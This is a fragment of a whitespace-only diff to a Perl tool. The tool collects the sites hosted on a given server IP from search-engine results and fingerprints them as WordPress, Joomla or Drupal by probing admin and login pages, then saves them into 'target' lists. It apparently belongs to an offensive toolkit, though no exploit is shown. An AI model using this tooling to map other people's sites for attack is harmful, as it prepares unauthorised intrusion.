 for ($ii = 1; $ii <= 2000; $ii+=10){
@@ -9251,7 +9328,7 @@ open(save, '>>sites-2.txt');
     close(save);
 						push(@result,$link);
 }
-} 
+}
 }
 }
 ####
@@ -9260,11 +9337,11 @@ exit;
 }
 }
 }
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
+
+
+
+
+
 sub THE
 {
 for ($ii = 1; $ii <= 2000; $ii+=10){
@@ -9296,7 +9373,7 @@ open(save, '>>target/sites-1.txt');
     close(save);
 						push(@result,$link);
 					}
-} 
+}
 }
 }
 ####
@@ -9307,11 +9384,11 @@ next OUTER;
 	print "saved at target/sites-1.txt";
 
 }
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
+
+
+
+
+
 sub Into
 {
 system(($^O eq 'MSWin32') ? 'cls' : 'clear');
@@ -9331,11 +9408,11 @@ $logo="
                                  dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
                                 dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                                 9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
-                                         9XXXXXX(___)XXXXXXP      
+                                         9XXXXXX(___)XXXXXXP
                                         xXXXXX X.'v'.X XXXXXx
                                             XXXbb   ddXXX
                                            x.X         X.x
-                                          b'             'd      
+                                          b'             'd
 
 ";
 print color("green"),$logo;
@@ -9368,7 +9445,7 @@ print color("green"),"[+] Choose Number : ";
 		print "\t>> Saved at Extract/WordPress.txt\n";
 		}
 	}
-	elsif ($choice1 eq "2") 
+	elsif ($choice1 eq "2")
 	{
 		print "\nExtract Joomla sites...\n";
 		print "==============================\n";
@@ -9417,7 +9494,7 @@ print color("green"),"[+] Choose Number : ";
 			print "Unknown Choice !!\nExiting...\n";
 			exit;
 		}
-			
+
 	}
 	elsif ($choice1 eq "d" or $choice1 eq "D" or $choice1 eq "3")
 	{
@@ -9465,7 +9542,7 @@ print color("green"),"[+] Choose Number : ";
 				print drupsite @DS;
 				print "\t>> Saved at Extract/Drupal.txt\n";
 			}
-			
+
 		}
 	}
 
@@ -9523,11 +9600,11 @@ print color("green"),"[+] Choose Number : ";
 
 	}
 }
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
+
+
+
+
+
 sub IP_id
  {
 	print "Enter the IP of the server or a site hosted on the same server\n";
@@ -9563,7 +9640,7 @@ sub IP_id
 			getSites();
 
                 }
-		else 
+		else
 		{
 			print "Site : $input\n";
 			print "Getting IP Adress...\n";
@@ -9572,14 +9649,14 @@ sub IP_id
 			print "Collecting the sites...\n";
 			getSites();
 		}
-	}	
+	}
 }
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-sub Joomla15 
+
+
+
+
+
+sub Joomla15
 {
         foreach $site (@result)
         {
@@ -9590,7 +9667,7 @@ sub Joomla15
                         push @JM,$site;
                         print "$site\n";
                 }
-                else 
+                else
                 {
                         $admin = "$site/administrator/";
                         $mech->get("$site");
@@ -9603,12 +9680,12 @@ sub Joomla15
                 }
         }
 }
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-sub Joomla 
+
+
+
+
+
+sub Joomla
 {
 	foreach $site (@result)
 	{
@@ -9621,7 +9698,7 @@ sub Joomla
 				push @JM,$site;
 				print "$site\n";
 			}
-			else 
+			else
 			{
 				$admin = "$site/administrator/";
 				$mech->get("$site");
@@ -9635,12 +9712,12 @@ sub Joomla
 		}
 	}
 }
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-sub DRV 
+
+
+
+
+
+sub DRV
 {
         foreach $site (@result)
         {
@@ -9652,14 +9729,14 @@ sub DRV
                         print "$site\n";
                 }
         }
-	
+
 }
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-sub searchdrupal 
+
+
+
+
+
+sub searchdrupal
 {
 	foreach $site (@result)
 	{
@@ -9675,11 +9752,11 @@ sub searchdrupal
 		}
 	}
 }
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
+
+
+
+
+
 sub WPS {
 	foreach $site (@result)
 	{
@@ -9694,14 +9771,14 @@ sub WPS {
 				$Scont = $mech->content;
 				$login = $site."wp-login.php";
 				$logUrl = $mech->get("$login");
-	 	                if ($Scont =~ m/WordPress/)     
+	 	                if ($Scont =~ m/WordPress/)
 				{
 					push @WPS,$site;
 					print "$site\n";
 				}
-				elsif($logUrl->is_success) 
+				elsif($logUrl->is_success)
 				{
-					push @WPS,$site; 
+					push @WPS,$site;
 					print "$site\n";
 				}
 
@@ -9713,11 +9790,11 @@ sub WPS {
 	}
 
 }
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
-####################################################################################################################
+
+
+
+
+
 sub getSites {
 	for($count=10;$count<=1000;$count+=10)
 	{
@@ -9733,16 +9810,16 @@ sub getSites {
 
 		while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g)
 		{
-	
+
 			$link = $1;
-		
+
 			if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
 			{
 				if ($link !~ /^http:/)
 				{
 					$link = 'http://' . "$link" . '/';
 				}
-	
+
 				if($link !~ /\"|\?|\=|index\.php/)
 				{
 					if  (!  grep (/$link/,@result))
@@ -9750,11 +9827,11 @@ sub getSites {
 						push(@result,$link);
 					}
 				}
-			} 
+			}
 		}
 	}
 	$found = $#result + 1;
 	print "found $found sites\n";
-	
+
 }
 }
